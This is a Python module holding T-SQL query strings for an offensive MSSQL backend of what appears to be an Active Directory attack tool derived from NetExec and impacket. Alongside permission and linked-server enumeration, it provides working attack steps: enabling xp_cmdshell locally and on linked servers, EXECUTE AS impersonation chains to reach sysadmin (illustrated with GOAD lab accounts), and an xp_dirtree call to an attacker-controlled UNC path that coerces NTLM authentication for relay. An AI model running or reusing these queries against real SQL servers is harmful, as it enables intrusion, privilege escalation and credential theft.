"""Canonical T-SQL queries used by the native MSSQL backend.

Each query lives here, not inline in the backend, so that:

* The SQL surface is auditable in one file.
* Reviewers can diff against the upstream NetExec source the queries were
  derived from (``reference/NetExec/nxc/modules/mssql_priv.py``,
  ``reference/NetExec/nxc/modules/enum_links.py``,
  ``reference/NetExec/nxc/modules/enable_cmdshell.py``).
* The backend stays focused on transport / parsing / presentation; query
  authoring is a separate concern.

These queries are designed to run with one round-trip per logical question.
``SWEEP_PRIVILEGES`` in particular collapses what NetExec spreads across five
modules into a single batch — that is the latency win of going native.
"""

from __future__ import annotations


# ---------------------------------------------------------------------------
# Identity & authentication probes
# ---------------------------------------------------------------------------

#: One-shot identity probe used right after login. Returns the effective
#: principal, the original login, server version and host name in a single
#: row. Cheap, runs against any server, and works regardless of permissions.
IDENTITY_FINGERPRINT = """
SELECT
    SUSER_SNAME()                                      AS [login_name],
    SYSTEM_USER                                        AS [system_user],
    ORIGINAL_LOGIN()                                   AS [original_login],
    CAST(@@SERVERNAME AS NVARCHAR(256))                AS [server_name],
    CAST(@@VERSION AS NVARCHAR(MAX))                   AS [server_version],
    CAST(SERVERPROPERTY('ProductVersion') AS NVARCHAR(64))  AS [product_version],
    CAST(SERVERPROPERTY('Edition')        AS NVARCHAR(128)) AS [edition],
    CAST(DB_NAME() AS NVARCHAR(128))                   AS [current_database]
""".strip()


#: Returns 1/0 in column ``is_sysadmin``. Used as the canonical privilege
#: signal because it transcends group nesting and EXECUTE AS context.
IS_SYSADMIN = "SELECT IS_SRVROLEMEMBER('sysadmin') AS [is_sysadmin]"


#: Returns 1/0 for arbitrary roles. Caller substitutes the role name; we
#: keep it parametric to enforce single-quote escaping at one site.
def is_srvrolemember(role: str) -> str:
    """Build a role-membership probe for one fixed server role."""
    safe_role = role.replace("'", "''")
    return f"SELECT IS_SRVROLEMEMBER('{safe_role}') AS [is_member]"


# ---------------------------------------------------------------------------
# Privilege sweep — the core "fingerprint in one round-trip" query
# ---------------------------------------------------------------------------

#: Returns the full effective-permission map at server scope. Each row is
#: one (entity_name, permission_name, state). Mirrored from
#: ``mssql_priv.py`` but executed once instead of per-permission.
EFFECTIVE_SERVER_PERMISSIONS = """
SELECT
    entity_name,
    permission_name,
    state_desc
FROM sys.fn_my_permissions(NULL, 'SERVER')
""".strip()


#: Lists every login the current principal can ``IMPERSONATE``. Sourced
#: verbatim from ``mssql_priv.get_impersonate_users``.
IMPERSONABLE_PRINCIPALS = """
SELECT DISTINCT b.name AS [name]
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
    ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name LIKE 'IMPERSONATE%'
""".strip()


#: Full ``server_principals`` roster with privilege flags. Sourced from the
#: ``enum_logins`` action in ``impacket.mssqlclient.py``. Reveals every
#: principal a sysadmin (or impersonated sysadmin) can see, including
#: hidden Kerberos-only logins.
ENUM_SERVER_LOGINS = """
SELECT
    CAST(r.name AS NVARCHAR(256))         AS [name],
    CAST(r.type_desc AS NVARCHAR(64))     AS [type_desc],
    r.is_disabled                         AS [is_disabled],
    sl.sysadmin                           AS [sysadmin],
    sl.securityadmin                      AS [securityadmin],
    sl.serveradmin                        AS [serveradmin],
    sl.setupadmin                         AS [setupadmin],
    sl.processadmin                       AS [processadmin],
    sl.diskadmin                          AS [diskadmin],
    sl.dbcreator                          AS [dbcreator],
    sl.bulkadmin                          AS [bulkadmin]
FROM master.sys.server_principals r
LEFT JOIN master.sys.syslogins sl ON sl.sid = r.sid
WHERE r.type IN ('S','E','X','U','G')
""".strip()


#: Server-level IMPERSONATE map across the whole instance. Mirrors the
#: ``enum_impersonate`` server-scope query from ``mssqlclient.py``.
SERVER_LEVEL_IMPERSONATION_MAP = """
SELECT
    'LOGIN'                       AS [scope],
    CAST('' AS NVARCHAR(128))     AS [database],
    CAST(pe.permission_name AS NVARCHAR(128))  AS [permission_name],
    CAST(pe.state_desc AS NVARCHAR(64))        AS [state_desc],
    CAST(pr.name  AS NVARCHAR(256))            AS [grantee],
    CAST(pr2.name AS NVARCHAR(256))            AS [grantor]
FROM sys.server_permissions pe
JOIN sys.server_principals pr  ON pe.grantee_principal_id = pr.principal_id
JOIN sys.server_principals pr2 ON pe.grantor_principal_id = pr2.principal_id
WHERE pe.type = 'IM'
""".strip()


#: Database-level IMPERSONATE map for a single database. Caller is
#: responsible for switching context with ``USE [<db>]`` first — wrapping
#: ``USE`` and the SELECT in one batch keeps the impacket parser happy.
def database_level_impersonation_map(database: str) -> str:
    """Return the per-database IMPERSONATE map query for one database."""
    safe_db = str(database).replace("]", "]]")
    return (
        f"USE [{safe_db}]; "
        "SELECT "
        "    'USER' AS [scope], "
        "    CAST(DB_NAME() AS NVARCHAR(128)) AS [database], "
        "    CAST(pe.permission_name AS NVARCHAR(128)) AS [permission_name], "
        "    CAST(pe.state_desc AS NVARCHAR(64))       AS [state_desc], "
        "    CAST(pr.name  AS NVARCHAR(256))           AS [grantee], "
        "    CAST(pr2.name AS NVARCHAR(256))           AS [grantor] "
        "FROM sys.database_permissions pe "
        "JOIN sys.database_principals pr  ON pe.grantee_principal_id = pr.principal_id "
        "JOIN sys.database_principals pr2 ON pe.grantor_principal_id = pr2.principal_id "
        "WHERE pe.type = 'IM'"
    )


#: Reads the running configuration of ``xp_cmdshell``. Returns the
#: ``run_value`` so we know whether it is enabled without having to parse
#: stderr from a failed exec attempt.
XP_CMDSHELL_STATE = """
SELECT
    CAST(name AS NVARCHAR(64))        AS [option],
    CAST(value AS INT)                AS [config_value],
    CAST(value_in_use AS INT)         AS [run_value]
FROM sys.configurations
WHERE name IN ('xp_cmdshell', 'show advanced options')
""".strip()


#: Lists databases owned by the calling principal. Trimmed from
#: ``mssql_priv.get_databases`` + ``is_db_owner`` to avoid a per-database
#: round-trip.
OWNED_DATABASES = """
SELECT d.name AS [database_name]
FROM sys.databases d
WHERE SUSER_SNAME(d.owner_sid) = SYSTEM_USER
  AND d.name NOT IN ('master', 'tempdb', 'model', 'msdb')
""".strip()


#: Trustworthy databases owned by sysadmin — these are the candidates for
#: ``db_owner`` privilege escalation. Sourced from
#: ``mssql_priv.find_trusted_databases``.
TRUSTED_DATABASES_OWNED_BY_SYSADMIN = """
SELECT d.name AS [database_name]
FROM sys.server_principals r
INNER JOIN sys.server_role_members m
    ON r.principal_id = m.role_principal_id
INNER JOIN sys.server_principals p
    ON p.principal_id = m.member_principal_id
INNER JOIN sys.databases d
    ON SUSER_SNAME(d.owner_sid) = p.name
WHERE d.is_trustworthy_on = 1
  AND d.name NOT IN ('msdb')
  AND r.type = 'R'
  AND r.name = N'sysadmin'
""".strip()


# ---------------------------------------------------------------------------
# Linked servers & pivot chain discovery
# ---------------------------------------------------------------------------

#: Lists linked servers visible to the calling principal. Mirror of
#: ``enum_links.get_linked_servers``.
LINKED_SERVERS_BASIC = "EXEC sp_linkedservers"


#: Richer link metadata — RPC out flag, data source, provider, and the
#: local↔remote login mapping. Used for the pivot-chain card.
LINKED_SERVERS_DETAIL = """
SELECT
    s.name              AS [linked_server],
    s.product           AS [product],
    s.provider          AS [provider],
    s.data_source       AS [data_source],
    s.is_rpc_out_enabled AS [rpc_out],
    s.is_data_access_enabled AS [data_access]
FROM sys.servers s
WHERE s.is_linked = 1
""".strip()


#: For each linked server, reports the local↔remote login mapping using
#: ``sp_helplinkedsrvlogin``. Requires sysadmin to be useful but degrades
#: gracefully (returns empty rowset for non-sysadmins on most editions).
LINKED_SERVERS_LOGIN_MAP = "EXEC sp_helplinkedsrvlogin"


# ---------------------------------------------------------------------------
# xp_cmdshell lifecycle
# ---------------------------------------------------------------------------

#: Enable advanced options + xp_cmdshell. Two-statement batch so we do not
#: leave ``show advanced options`` toggled if the second call fails.
ENABLE_XP_CMDSHELL = """
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
""".strip()


#: Symmetric counterpart. Used by cleanup paths that toggle xp_cmdshell off
#: when finishing exploitation.
DISABLE_XP_CMDSHELL = """
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
EXEC sp_configure 'show advanced options', 0; RECONFIGURE;
""".strip()


def enable_xp_cmdshell_on_link(linked_server: str) -> str:
    """Build the linked-server variant of :data:`ENABLE_XP_CMDSHELL`.

    The inner SQL runs in the *remote* server's context via ``EXEC ... AT``.
    Both ``show advanced options`` and ``xp_cmdshell`` must be toggled —
    pristine SQL Express instances always need the former first, and
    re-toggling it on already-configured boxes is a harmless no-op. Each
    statement is prefixed with ``EXEC`` because, after the first ``;``,
    SQL Server requires the explicit verb to recognise the SP call.
    """
    safe_linked_server = str(linked_server).replace("]", "]]")
    return (
        "EXEC ('"
        "EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;"
        "EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;"
        f"') AT [{safe_linked_server}]"
    )


def disable_xp_cmdshell_on_link(linked_server: str) -> str:
    """Symmetric counterpart of :func:`enable_xp_cmdshell_on_link`."""
    safe_linked_server = str(linked_server).replace("]", "]]")
    return (
        f"EXEC ('sp_configure ''xp_cmdshell'', 0; RECONFIGURE;') "
        f"AT [{safe_linked_server}]"
    )


# ---------------------------------------------------------------------------
# Identity probe wrapped for a linked server
# ---------------------------------------------------------------------------


def identity_fingerprint_at_link(linked_server: str) -> str:
    """Return :data:`IDENTITY_FINGERPRINT` executed at one linked server."""
    safe_linked_server = str(linked_server).replace("]", "]]")
    inner = IDENTITY_FINGERPRINT.replace("'", "''")
    return f"EXEC ('{inner}') AT [{safe_linked_server}]"


# ---------------------------------------------------------------------------
# Impersonation — EXECUTE AS LOGIN / USER chains
# ---------------------------------------------------------------------------


def execute_as_login(target_login: str, inner_query: str) -> str:
    """Wrap an inner query in ``EXECUTE AS LOGIN = '<target>'`` + ``REVERT``.

    Used to validate impersonation rights. ``samwell.tarly`` for example
    can ``IMPERSONATE`` the ``sa`` login, so running
    ``execute_as_login('sa', queries.IS_SYSADMIN)`` should return
    ``is_sysadmin=1`` even though samwell himself is not a sysadmin.
    """
    safe_login = str(target_login).replace("'", "''")
    return (
        f"EXECUTE AS LOGIN = '{safe_login}'; "
        f"{inner_query}; "
        f"REVERT;"
    )


def execute_as_user(target_user: str, inner_query: str) -> str:
    """Database-scope counterpart of :func:`execute_as_login`.

    Required for the trustworthy-database escalation path: ``arya.stark``
    on GOAD can ``EXECUTE AS USER = 'dbo'`` inside ``msdb``, and because
    ``msdb`` is trustworthy that elevates to sysadmin in the parent server.
    """
    safe_user = str(target_user).replace("'", "''")
    return (
        f"EXECUTE AS USER = '{safe_user}'; "
        f"{inner_query}; "
        f"REVERT;"
    )


# ---------------------------------------------------------------------------
# Coercion — xp_dirtree / xp_fileexist NTLM authentication trigger
# ---------------------------------------------------------------------------


def xp_dirtree_unc(unc_path: str) -> str:
    """Build an ``xp_dirtree`` call against an attacker-controlled UNC path.

    Triggers an outbound SMB authentication from the SQL service account
    that ADscan can capture with a relay listener. Does not require
    sysadmin — public has EXECUTE on ``xp_dirtree`` by default.
    """
    safe_path = str(unc_path).replace("'", "''")
    return f"EXEC master..xp_dirtree '{safe_path}'"


# ---------------------------------------------------------------------------
# Authorization collector — read-only server-scope authorization facts
# ---------------------------------------------------------------------------
#
# These three queries are the MSSQL equivalent of the ACEs the LDAP/SMB
# collector materializes. They feed the eager ``mssql_collector`` which resolves
# SQL-internal authorization (login -> role -> sysadmin, CONTROL SERVER) into
# effective SQLAccess/SQLAdmin edges between AD principal/group nodes and the
# instance host node. Derived (NOT verbatim) from
# ``reference/MSSQLHound/internal/mssql/client.go`` (collectServerPrincipals,
# collectServerRoleMemberships, collectServerPermissions). All three depend on
# metadata visibility: a low-priv (CONNECT-only) login sees only its own rows;
# ``VIEW ANY DEFINITION`` / sysadmin / securityadmin unlocks the full
# cross-principal roster. The collector degrades by privilege accordingly.

#: Full server-principal roster. ``CONVERT(VARCHAR(85), p.sid, 1)`` renders the
#: binary SID as a ``0x...`` hex string the collector converts to ``S-1-5-...``
#: for AD-node correlation. ``type``: S=SQL login, U=Windows user, G=Windows
#: group, R=server role, C=cert-mapped, K=asymmetric-key-mapped, E/X=external.
COLLECT_SERVER_PRINCIPALS = """
SELECT
    p.principal_id                              AS [principal_id],
    CAST(p.name AS NVARCHAR(256))               AS [name],
    CAST(p.type AS NVARCHAR(4))                 AS [type],
    CAST(p.type_desc AS NVARCHAR(64))           AS [type_desc],
    p.is_disabled                               AS [is_disabled],
    p.is_fixed_role                             AS [is_fixed_role],
    CONVERT(VARCHAR(85), p.sid, 1)              AS [sid]
FROM sys.server_principals p
WHERE p.type IN ('S', 'U', 'G', 'R', 'C', 'K', 'E', 'X')
ORDER BY p.principal_id
""".strip()


#: Every server-role membership edge (member principal -> role principal). The
#: collector walks these transitively to compute effective ``sysadmin``.
COLLECT_SERVER_ROLE_MEMBERS = """
SELECT
    rm.member_principal_id                      AS [member_principal_id],
    rm.role_principal_id                        AS [role_principal_id],
    CAST(r.name AS NVARCHAR(256))               AS [role_name]
FROM sys.server_role_members rm
JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id
ORDER BY rm.member_principal_id
""".strip()


#: Explicit server-scope permission grants/denies. ``CONTROL SERVER`` (GRANT)
#: is sysadmin-equivalent; the collector treats it as effective SQLAdmin.
COLLECT_SERVER_PERMISSIONS = """
SELECT
    p.grantee_principal_id                      AS [grantee_principal_id],
    CAST(p.permission_name AS NVARCHAR(128))    AS [permission_name],
    CAST(p.state_desc AS NVARCHAR(64))          AS [state_desc],
    CAST(p.class_desc AS NVARCHAR(64))          AS [class_desc],
    p.major_id                                  AS [major_id]
FROM sys.server_permissions p
WHERE p.state_desc IN ('GRANT', 'GRANT_WITH_GRANT_OPTION', 'DENY')
ORDER BY p.grantee_principal_id
""".strip()


__all__ = [
    "IDENTITY_FINGERPRINT",
    "IS_SYSADMIN",
    "is_srvrolemember",
    "EFFECTIVE_SERVER_PERMISSIONS",
    "IMPERSONABLE_PRINCIPALS",
    "XP_CMDSHELL_STATE",
    "OWNED_DATABASES",
    "TRUSTED_DATABASES_OWNED_BY_SYSADMIN",
    "LINKED_SERVERS_BASIC",
    "LINKED_SERVERS_DETAIL",
    "LINKED_SERVERS_LOGIN_MAP",
    "ENABLE_XP_CMDSHELL",
    "DISABLE_XP_CMDSHELL",
    "enable_xp_cmdshell_on_link",
    "disable_xp_cmdshell_on_link",
    "identity_fingerprint_at_link",
    "execute_as_login",
    "execute_as_user",
    "xp_dirtree_unc",
    "ENUM_SERVER_LOGINS",
    "SERVER_LEVEL_IMPERSONATION_MAP",
    "database_level_impersonation_map",
    "COLLECT_SERVER_PRINCIPALS",
    "COLLECT_SERVER_ROLE_MEMBERS",
    "COLLECT_SERVER_PERMISSIONS",
]
